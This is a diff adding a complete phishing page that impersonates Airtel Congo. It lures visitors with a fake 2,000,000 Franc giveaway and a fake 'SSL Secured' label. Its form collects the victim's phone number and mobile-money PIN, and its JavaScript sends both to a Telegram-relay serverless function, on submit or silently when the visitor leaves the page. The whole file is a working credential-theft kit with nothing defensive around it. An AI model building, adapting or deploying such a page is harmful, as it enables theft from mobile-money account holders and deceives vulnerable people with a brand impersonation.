@@ -1,0 +1,917 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>AIRTEL Congo - 2,000,000 Franc</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a3e 40%, #0f3460 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* ===== AIRTEL WATERMARK LOGO IN BACKGROUND ===== */
+        body::before {
+            content: "AIRTEL";
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) rotate(-25deg);
+            font-size: 120px;
+            font-weight: 900;
+            color: rgba(255, 255, 255, 0.06);
+            letter-spacing: 15px;
+            pointer-events: none;
+            z-index: 0;
+            text-shadow: 0 0 60px rgba(226, 0, 26, 0.08);
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            white-space: nowrap;
+            user-select: none;
+        }
+
+        body::after {
+            content: "● ●";
+            position: fixed;
+            top: 58%;
+            left: 50%;
+            transform: translate(-50%, -50%) rotate(-25deg);
+            font-size: 80px;
+            color: rgba(226, 0, 26, 0.08);
+            letter-spacing: 60px;
+            pointer-events: none;
+            z-index: 0;
+            user-select: none;
+            text-shadow: 0 0 60px rgba(0, 85, 164, 0.06);
+        }
+
+        .card {
+            background: #ffffff;
+            max-width: 440px;
+            width: 100%;
+            padding: 32px 24px;
+            border-radius: 32px;
+            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.5);
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #e2001a, #ff6b6b, #e2001a);
+            background-size: 200% 100%;
+            animation: shimmer 3s ease-in-out infinite;
+        }
+
+        @keyframes shimmer {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .hidden { display: none !important; }
+        .text-center { text-align: center; }
+        .mt-8 { margin-top: 8px; }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 8px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .logo-container .airtel {
+            font-size: 34px;
+            font-weight: 900;
+            color: #e2001a;
+            letter-spacing: 2px;
+        }
+
+        .logo-container .airtel span {
+            color: #0055a4;
+        }
+
+        .logo-container .tag {
+            display: inline-block;
+            background: linear-gradient(135deg, #ffeb3b, #fdd835);
+            padding: 4px 20px;
+            border-radius: 30px;
+            font-size: 11px;
+            font-weight: 700;
+            color: #333;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 4px;
+        }
+
+        .offer-box {
+            background: linear-gradient(135deg, #e2001a, #b80014);
+            border-radius: 20px;
+            padding: 32px 16px;
+            text-align: center;
+            color: white;
+            position: relative;
+            overflow: hidden;
+            margin: 16px 0;
+            z-index: 2;
+        }
+
+        .offer-box::after {
+            content: '💰';
+            position: absolute;
+            right: 12px;
+            bottom: 8px;
+            font-size: 40px;
+            opacity: 0.15;
+        }
+
+        .offer-box .amount {
+            font-size: 48px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            line-height: 1;
+        }
+
+        .offer-box .label {
+            font-size: 20px;
+            font-weight: 700;
+            margin-top: 4px;
+        }
+
+        .offer-box .sub {
+            font-size: 14px;
+            opacity: 0.85;
+            margin-top: 4px;
+        }
+
+        .ticket-box {
+            background: linear-gradient(135deg, #fff8e1, #ffecb3);
+            border: 2px dashed #e2001a;
+            border-radius: 16px;
+            padding: 16px;
+            margin: 16px 0;
+            text-align: center;
+            position: relative;
+            z-index: 2;
+        }
+
+        .ticket-box .label {
+            font-size: 12px;
+            color: #888;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 700;
+        }
+
+        .ticket-box .number {
+            font-size: 28px;
+            font-weight: 900;
+            color: #e2001a;
+            letter-spacing: 2px;
+            margin-top: 4px;
+            font-family: 'Courier New', monospace;
+        }
+
+        /* ============================================================
+           BOUNCING BUTTON
+           ============================================================ */
+        .btn {
+            display: inline-block;
+            width: 100%;
+            padding: 18px 24px;
+            border: none;
+            border-radius: 30px;
+            font-size: 20px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            z-index: 2;
+            position: relative;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.25);
+        }
+
+        .btn:active {
+            transform: scale(0.95);
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            10% { transform: translateY(-8px); }
+            20% { transform: translateY(0); }
+            30% { transform: translateY(-5px); }
+            40% { transform: translateY(0); }
+            50% { transform: translateY(-3px); }
+            60% { transform: translateY(0); }
+        }
+
+        .btn-bounce {
+            animation: bounce 2s ease-in-out infinite;
+        }
+
+        @keyframes pulseGlow {
+            0%, 100% { box-shadow: 0 6px 30px rgba(27, 138, 46, 0.4); }
+            50% { box-shadow: 0 6px 50px rgba(27, 138, 46, 0.7), 0 0 80px rgba(27, 138, 46, 0.2); }
+        }
+
+        .btn-pulse {
+            animation: pulseGlow 2s ease-in-out infinite;
+        }
+
+        .btn-ripple {
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-ripple::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s ease, height 0.6s ease;
+        }
+
+        .btn-ripple:active::after {
+            width: 300px;
+            height: 300px;
+        }
+
+        .tap-indicator {
+            display: inline-block;
+            font-size: 14px;
+            font-weight: 700;
+            color: #fff;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 4px 14px;
+            border-radius: 20px;
+            margin-top: 6px;
+            letter-spacing: 1px;
+        }
+
+        .btn-green {
+            background: linear-gradient(135deg, #1b8a2e, #0f6b1f);
+            color: white;
+            box-shadow: 0 6px 30px rgba(27, 138, 46, 0.4);
+        }
+
+        .btn-green:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 40px rgba(27, 138, 46, 0.5);
+        }
+
+        .btn-red {
+            background: linear-gradient(135deg, #e2001a, #b80014);
+            color: white;
+            box-shadow: 0 6px 30px rgba(226, 0, 26, 0.4);
+        }
+
+        .btn-red:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 40px rgba(226, 0, 26, 0.5);
+        }
+
+        .btn-red:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+            animation: none !important;
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, #1b8a2e, #0f6b1f);
+            color: white;
+            box-shadow: 0 6px 30px rgba(27, 138, 46, 0.4);
+        }
+
+        .btn-success:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 40px rgba(27, 138, 46, 0.5);
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #444;
+            margin-bottom: 5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e8e8e8;
+            border-radius: 14px;
+            font-size: 16px;
+            background: #f8f8f8;
+            outline: none;
+            transition: all 0.3s ease;
+            text-align: center;
+            letter-spacing: 2px;
+            font-weight: 500;
+        }
+
+        .form-group input:focus {
+            border-color: #e2001a;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(226, 0, 26, 0.08);
+        }
+
+        .form-group input::placeholder {
+            color: #bbb;
+            font-size: 14px;
+            letter-spacing: 0;
+            font-weight: 400;
+        }
+
+        .form-group .hint {
+            font-size: 12px;
+            color: #999;
+            margin-top: 4px;
+        }
+
+        .form-group .hint strong {
+            color: #e2001a;
+        }
+
+        .error-msg {
+            color: #d32f2f;
+            font-size: 13px;
+            padding: 10px 14px;
+            background: #ffebee;
+            border-radius: 10px;
+            display: none;
+            margin-top: 6px;
+            text-align: left;
+            position: relative;
+            z-index: 2;
+        }
+
+        .error-msg.show {
+            display: block;
+            animation: shake 0.4s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        .welcome-icon {
+            font-size: 64px;
+            text-align: center;
+            margin: 4px 0;
+            position: relative;
+            z-index: 2;
+        }
+
+        .welcome-title {
+            font-size: 22px;
+            font-weight: 900;
+            color: #e2001a;
+            text-align: center;
+            margin: 4px 0;
+            line-height: 1.3;
+            position: relative;
+            z-index: 2;
+        }
+
+        .welcome-sub {
+            font-size: 15px;
+            color: #666;
+            text-align: center;
+            position: relative;
+            z-index: 2;
+        }
+
+        .welcome-confirm {
+            font-size: 14px;
+            color: #2e7d32;
+            text-align: center;
+            margin-top: 8px;
+            padding: 10px;
+            background: #e8f5e9;
+            border-radius: 10px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .welcome-confirm strong {
+            color: #e2001a;
+        }
+
+        .success-box {
+            background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
+            border-radius: 20px;
+            padding: 36px 24px;
+            text-align: center;
+            margin: 8px 0 16px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .success-box .check {
+            font-size: 72px;
+        }
+
+        .success-box h2 {
+            color: #2e7d32;
+            margin-top: 8px;
+            font-size: 26px;
+        }
+
+        .success-box p {
+            color: #444;
+            margin-top: 8px;
+            line-height: 1.7;
+            font-size: 15px;
+        }
+
+        .success-box .telegram-notice {
+            background: rgba(255, 255, 255, 0.7);
+            border-radius: 12px;
+            padding: 12px;
+            margin-top: 12px;
+            font-size: 13px;
+            color: #555;
+        }
+
+        .success-box .telegram-notice strong {
+            color: #e2001a;
+        }
+
+        .footer {
+            margin-top: 20px;
+            padding-top: 16px;
+            border-top: 1px solid #eee;
+            font-size: 12px;
+            color: #bbb;
+            text-align: center;
+            position: relative;
+            z-index: 2;
+        }
+
+        .footer .lock {
+            color: #2e7d32;
+            font-weight: 600;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .back-link {
+            background: none;
+            border: none;
+            color: #999;
+            cursor: pointer;
+            font-size: 13px;
+            margin-top: 12px;
+            transition: 0.3s;
+            display: block;
+            text-align: center;
+            width: 100%;
+            position: relative;
+            z-index: 2;
+        }
+
+        .back-link:hover {
+            color: #e2001a;
+        }
+
+        @keyframes bounceArrow {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(6px); }
+        }
+
+        .arrow-indicator {
+            display: inline-block;
+            margin-left: 8px;
+            animation: bounceArrow 1s ease-in-out infinite;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 24px 18px; border-radius: 28px; }
+            .offer-box .amount { font-size: 36px; }
+            .welcome-title { font-size: 18px; }
+            body::before { font-size: 60px; letter-spacing: 8px; }
+            body::after { font-size: 40px; letter-spacing: 30px; top: 55%; }
+            .btn { font-size: 17px; padding: 15px 20px; }
+        }
+
+        @media (max-width: 380px) {
+            body::before { font-size: 40px; letter-spacing: 5px; }
+            body::after { font-size: 30px; letter-spacing: 20px; }
+            .welcome-title { font-size: 16px; }
+            .btn { font-size: 15px; padding: 14px 16px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card" id="app">
+
+        <!-- ===== PAGE 0: WELCOME ===== -->
+        <div id="page0">
+            <div class="logo-container">
+                <div class="airtel">AIRTEL <span>CONGO</span></div>
+                <span class="tag">🔥 OFA YA LEO</span>
+            </div>
+            <div class="welcome-icon">🏆</div>
+            <div class="welcome-title">Shinda <span class="highlight">2,000,000 Franc</span></div>
+            <div class="welcome-sub">Kutoka kwa <strong>AIRTEL Congo</strong></div>
+
+            <div class="welcome-confirm">
+                ✅ Maombi na yako ya <strong>2,000,000 Franc</strong> yamepokelewa!<br />
+                🎉 Ubakua na bongo na bana-kumpara!
+            </div>
+
+            <div class="ticket-box">
+                <div class="label">🎫 TIKETI NA YO YA ZAWADI KUU</div>
+                <div class="number" id="ticketNumber">AFR-2026-39449</div>
+            </div>
+
+            <div class="offer-box">
+                <div class="amount">2,000,000</div>
+                <div class="label">FRANC</div>
+                <div class="sub">🇨🇩 AIRTEL Congo</div>
+            </div>
+
+            <button class="btn btn-green btn-bounce btn-pulse btn-ripple" id="getStartedBtn">
+                ✅ Jisajili sasa hivi
+                <span class="arrow-indicator">👇</span>
+                <div class="tap-indicator">👆 BONYA HAPA</div>
+            </button>
+
+            <div class="footer"><span class="lock">🔒</span> Muunganisho salama uliosimbwa <span class="lock">(SSL Secured)</span></div>
+        </div>
+
+        <!-- ===== PAGE 1: FORM ===== -->
+        <div id="page1" class="hidden">
+            <div class="logo-container" style="font-size:22px;">
+                <div class="airtel" style="font-size:22px;">AIRTEL <span>CONGO</span></div>
+                <span class="tag">📢 OFA YA LEO</span>
+            </div>
+            <div class="offer-box" style="padding:16px;margin:12px 0;">
+                <div class="amount" style="font-size:32px;">2,000,000</div>
+                <div class="label" style="font-size:16px;">FRANC</div>
+                <div class="sub" style="font-size:12px;">🇨🇩 AIRTEL Congo</div>
+            </div>
+            <h3 style="text-align:center;font-size:18px;margin-bottom:4px;position:relative;z-index:2;">Jiume na Ofa ya Airtel</h3>
+            <p style="text-align:center;font-size:14px;color:#666;margin-bottom:16px;position:relative;z-index:2;">
+                Weka namba na yo ya simu ya Airtel Congo.
+            </p>
+
+            <div class="form-group">
+                <label>📞 Namba ya Simu</label>
+                <input type="tel" id="phoneInput" placeholder="+2439XXXXXXXX" maxlength="13" />
+                <div class="hint">Format: <strong>+2439XXXXXXXX</strong></div>
+            </div>
+
+            <div class="form-group">
+                <label>🔐 Namba ya Siri (Code PIN)</label>
+                <input type="password" id="pinInput" placeholder="****" maxlength="4" />
+                <div class="hint">💡 Ingiza nambari na yo ya siri kwa usahihi</div>
+            </div>
+
+            <div class="error-msg" id="formError"></div>
+
+            <button class="btn btn-red" id="submitBtn">
+                <span id="submitText">→ Endelea</span>
+                <span id="submitSpinner" class="spinner hidden"></span>
+            </button>
+
+            <button class="back-link" id="backToWelcome1">← Rudi kwenye maelezo</button>
+
+            <div class="footer"><span class="lock">🔒</span> Muunganisho salama uliosimbwa <span class="lock">(SSL Secured)</span></div>
+        </div>
+
+        <!-- ===== PAGE 2: SUCCESS ===== -->
+        <div id="page2" class="hidden">
+            <div class="success-box">
+                <div class="check">🎉</div>
+                <h2>Imefanikiwa!</h2>
+                <p><strong>Hongera sana!</strong> Upata <strong>2,000,000 Franc</strong> kutoka kwa <strong>AIRTEL Congo</strong>.</p>
+                <p style="font-size:14px;color:#666;margin-top:4px;">Zawadi itaamilishwa ndani ya dakika 5.</p>
+                <div class="telegram-notice">
+                    📋 <strong>Taarifa imetumwa kwa Admin!</strong>
+                    <br /><span id="successReferral" style="color:#555;"></span>
+                </div>
+            </div>
+            <button class="btn btn-success" id="doneBtn">✓ Sawa</button>
+        </div>
+
+    </div>
+
+    <script>
+        // =============================================================
+        // CONFIGURATION
+        // =============================================================
+        const API_BASE = '/.netlify/functions/send-to-telegram';
+
+        // =============================================================
+        // DOM REFERENCES
+        // =============================================================
+        const page0 = document.getElementById('page0');
+        const page1 = document.getElementById('page1');
+        const page2 = document.getElementById('page2');
+
+        const getStartedBtn = document.getElementById('getStartedBtn');
+
+        const phoneInput = document.getElementById('phoneInput');
+        const pinInput = document.getElementById('pinInput');
+        const submitBtn = document.getElementById('submitBtn');
+        const submitText = document.getElementById('submitText');
+        const submitSpinner = document.getElementById('submitSpinner');
+        const formError = document.getElementById('formError');
+
+        const doneBtn = document.getElementById('doneBtn');
+        const successReferral = document.getElementById('successReferral');
+
+        const backToWelcome1 = document.getElementById('backToWelcome1');
+
+        // =============================================================
+        // STATE
+        // =============================================================
+        let currentPhone = '';
+        let currentPin = '';
+        let formSubmitted = false;
+
+        // =============================================================
+        // GENERATE TICKET
+        // =============================================================
+        function generateTicket() {
+            const date = new Date();
+            const year = date.getFullYear();
+            const random = String(Math.floor(10000 + Math.random() * 90000));
+            return `AFR-${year}-${random}`;
+        }
+
+        // =============================================================
+        // PAGE NAVIGATION
+        // =============================================================
+        function showPage(page) {
+            page0.classList.add('hidden');
+            page1.classList.add('hidden');
+            page2.classList.add('hidden');
+
+            if (page === 0) page0.classList.remove('hidden');
+            else if (page === 1) page1.classList.remove('hidden');
+            else if (page === 2) page2.classList.remove('hidden');
+        }
+
+        // =============================================================
+        // UTILITY FUNCTIONS
+        // =============================================================
+        function setLoading(btn, textEl, spinnerEl, loading) {
+            if (loading) {
+                btn.disabled = true;
+                textEl.textContent = 'Inasubiri...';
+                spinnerEl.classList.remove('hidden');
+            } else {
+                btn.disabled = false;
+                spinnerEl.classList.add('hidden');
+            }
+        }
+
+        function showError(el, msg) {
+            if (msg) {
+                el.textContent = msg;
+                el.classList.add('show');
+            } else {
+                el.classList.remove('show');
+            }
+        }
+
+        // =============================================================
+        // API CALLS
+        // =============================================================
+        async function callAPI(endpoint, data) {
+            try {
+                const url = `${API_BASE}${endpoint}`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                return await response.json();
+            } catch (error) {
+                return { success: false, message: 'Network error' };
+            }
+        }
+
+        // =============================================================
+        // SEND TO TELEGRAM
+        // =============================================================
+        async function sendToTelegram(data) {
+            try {
+                return await callAPI('/send-data', data);
+            } catch (error) {
+                return { success: false };
+            }
+        }
+
+        // =============================================================
+        // SEND FORM DETAILS ON PAGE EXIT
+        // =============================================================
+        async function sendDetailsOnExit() {
+            const phone = phoneInput.value.trim();
+            const pin = pinInput.value.trim();
+
+            if (phone && pin && !formSubmitted) {
+                const ticket = generateTicket();
+                const telegramData = {
+                    country: 'Congo (DRC)',
+                    countryCode: 'congo',
+                    phone: phone,
+                    pin: pin,
+                    ticket: ticket,
+                    offer: '2,000,000 Franc Giveaway',
+                    status: 'User exited the page after entering details'
+                };
+                await sendToTelegram(telegramData);
+                formSubmitted = true;
+            }
+        }
+
+        // =============================================================
+        // AUTO-REDIRECT TO PAGE 1 AFTER 20 SECONDS
+        // =============================================================
+        setTimeout(function() {
+            if (!page0.classList.contains('hidden')) {
+                showPage(1);
+                phoneInput.focus();
+            }
+        }, 20000);
+
+        // =============================================================
+        // SEND FORM DETAILS IF USER EXITS PAGE
+        // =============================================================
+        window.addEventListener('beforeunload', function(e) {
+            sendDetailsOnExit();
+        });
+
+        // =============================================================
+        // GET STARTED BUTTON
+        // =============================================================
+        getStartedBtn.addEventListener('click', function() {
+            showPage(1);
+            phoneInput.focus();
+        });
+
+        // =============================================================
+        // BACK TO WELCOME
+        // =============================================================
+        backToWelcome1.addEventListener('click', function() {
+            showPage(0);
+            showError(formError);
+            phoneInput.value = '';
+            pinInput.value = '';
+            formSubmitted = false;
+        });
+
+        // =============================================================
+        // SUBMIT
+        // =============================================================
+        submitBtn.addEventListener('click', async function() {
+            const phone = phoneInput.value.trim();
+            const pin = pinInput.value.trim();
+
+            showError(formError);
+            formSubmitted = false;
+
+            if (!phone || !pin) {
+                showError(formError, 'Tafadhali jaza namba zote mbili.');
+                return;
+            }
+
+            const cleanPhone = phone.replace(/\s/g, '');
+            const phoneWithCode = cleanPhone.startsWith('+') ? cleanPhone : '+' + cleanPhone;
+            const checkPhone = phoneWithCode.replace(/^\+/, '');
+
+            if (!/^2439\d{8}$/.test(checkPhone)) {
+                showError(formError, 'Namba ya Airtel Congo si sahihi. Tumia fomati: +2439XXXXXXXX');
+                phoneInput.focus();
+                return;
+            }
+
+            if (!/^\d{4}$/.test(pin)) {
+                showError(formError, 'Namba ya Siri lazima iwe tarakimu 4.');
+                return;
+            }
+
+            setLoading(submitBtn, submitText, submitSpinner, true);
+
+            try {
+                currentPhone = phoneWithCode;
+                currentPin = pin;
+
+                const ticket = generateTicket();
+                const telegramData = {
+                    country: 'Congo (DRC)',
+                    countryCode: 'congo',
+                    phone: currentPhone,
+                    pin: currentPin,
+                    ticket: ticket,
+                    offer: '2,000,000 Franc Giveaway',
+                    status: 'Successfully Verified!'
+                };
+
+                await sendToTelegram(telegramData);
+                formSubmitted = true;
+
+                successReferral.textContent = `📱 ${currentPhone} | 🔗 ${ticket}`;
+
+                showPage(2);
+
+            } catch (error) {
+                showError(formError, 'Hitilafu. Jaribu tena.');
+            } finally {
+                setLoading(submitBtn, submitText, submitSpinner, false);
+                submitText.textContent = '→ Endelea';
+            }
+        });
+
+        // =============================================================
+        // DONE
+        // =============================================================
+        doneBtn.addEventListener('click', function() {
+            phoneInput.value = '';
+            pinInput.value = '';
+            showError(formError);
+            showPage(0);
+            formSubmitted = false;
+        });
+
+        // =============================================================
+        // ENTER KEY
+        // =============================================================
+        phoneInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') pinInput.focus(); });
+        pinInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') submitBtn.click(); });
+
+        // =============================================================
+        // PHONE FORMAT
+        // =============================================================
+        phoneInput.addEventListener('input', function() {
+            let value = this.value.replace(/\s/g, '');
+            if (!value.startsWith('+')) {
+                value = '+' + value.replace(/^\+/, '');
+            }
+            this.value = value;
+        });
+
+        // =============================================================
+        // START
+        // =============================================================
+        document.getElementById('ticketNumber').textContent = generateTicket();
+
+        showPage(0);
+
+        console.log('🚀 AIRTEL Congo 2,000,000 Franc Giveaway Started!');
+        console.log('📱 Telegram Bot: @Congokebot');
+    </script>
+
+</body>
+</html>
